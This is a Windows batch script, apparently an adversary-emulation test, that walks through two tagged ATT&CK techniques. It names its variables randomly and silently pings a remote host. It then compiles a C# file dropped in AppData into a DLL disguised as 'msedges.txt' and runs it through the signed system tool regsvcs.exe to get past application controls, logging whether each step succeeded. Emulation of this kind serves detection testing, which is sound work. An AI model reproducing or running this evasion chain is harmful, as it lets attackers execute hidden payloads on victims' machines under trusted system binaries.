@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\9313\42587537
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?9313-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=msedges.txt
SET njozco=file.txt
SET kkjwr=9313
SET kppjcuu=%APPDATA%\!ufeybybm!\macula-simulations.log
SET eweqay=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe
SET jwthym=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start=initiating>> "!kppjcuu!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete=200>> "!kppjcuu!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start=!recnn!>> "!kppjcuu!" 2>nul
cd /d "!recnn!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_complete=!cd!>> "!kppjcuu!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!kppjcuu!" 2>nul
"!eweqay!" /target:library /reference:System.EnterpriseServices.dll "!njozco!" /out:"!hpnjatpj!" >nul 2>&1
IF EXIST "!hpnjatpj!" (
SET nnnjnt=1&SET djvm=
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_complete=success>> "!kppjcuu!" 2>nul
) ELSE (
SET nnnjnt=0&SET djvm=compile_failed
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_complete=failed>> "!kppjcuu!" 2>nul
)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!nnnjnt!:!djvm!>> "!kppjcuu!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_start=regsvcs>> "!kppjcuu!" 2>nul
"!jwthym!" "!hpnjatpj!" >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
SET ccewjr=1&SET uvtvk=
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_complete=success>> "!kppjcuu!" 2>nul
) ELSE (
SET ccewjr=0&SET uvtvk=exec_failed
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_complete=failed>> "!kppjcuu!" 2>nul
)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|System Binary Proxy Execution=!ccewjr!:!uvtvk!>> "!kppjcuu!" 2>nul